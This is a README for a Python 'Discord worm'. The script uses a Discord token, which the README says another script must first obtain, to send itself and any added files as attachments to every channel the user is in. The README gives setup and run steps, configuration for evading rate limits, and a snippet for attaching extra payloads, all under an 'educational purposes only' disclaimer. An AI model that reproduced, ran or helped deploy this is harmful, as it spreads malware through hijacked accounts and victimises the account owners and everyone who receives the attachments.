# Discord Worm

## Introduction

This is a simple Discord worm script written in Python using the requests library. The script sends a message with an attached file to all the channels in which the user is present. This script is intended for educational purposes only, and the author takes no responsibility for any misuse.

**Note:** The use of such scripts to spread unsolicited messages or files is against Discord's Terms of Service. Use it responsibly and only in environments where you have explicit permission.

## Getting Started

### Prerequisites

- Python 3.x
- requests library (install via `pip install -r requirements.txt`)

### Usage

1. Clone the repository:

    ```bash
    git clone https://github.com/Syntaxerrorontop/DiscordWorm
    cd discord-worm
    ```

2. Open `worm.py` and update the following variables:

    - `SELF_NAME`: The name of the script file.
    - `MESSAGE`: The message you want to send.
    - `RATE_LIMIT_DELAY`: Delay between sending messages (in seconds).
    - `REQUEST_TIMEOUT`: Timeout for HTTP requests (in seconds).
    - `USER_AGENT`: User agent for HTTP requests.
    - `DEBUG`: Set to `True` to avoid sending messages.

3. Run the script:

    ```bash
    python worm.py
    ```

    You also need a script that get the Token then execute this script
    To Run ony This script will do nothing!

## Configuration

- **SELF_NAME**: The name of the script file that will be sent as an attachment.
- **MESSAGE**: The message you want to send along with the attachment.
- **RATE_LIMIT_DELAY**: Delay between sending messages to avoid rate limiting.
- **REQUEST_TIMEOUT**: Timeout for HTTP requests.
- **USER_AGENT**: User agent for HTTP requests.
- **DEBUG**: Set to `True` to run in debug mode (no messages will be sent).

## Customization

### Adding Files

To attach additional files along with the script, use the `add_file` method:

```python
worm = Worm("YOUR_DISCORD_TOKEN")
worm.add_file("/path/to/file.png", "custom_file_name.png")
```

### Friend List Processing

You can customize the `get_friend_list` method to process the friend list obtained from Discord.

### Processing Channel IDs

You can customize the `get_channel_ids` method to process the list of channel IDs obtained from Discord.

## Disclaimer

This script is for educational purposes only. Use it responsibly and ensure compliance with Discord's Terms of Service. The author is not responsible for any misuse or damage caused by the script.
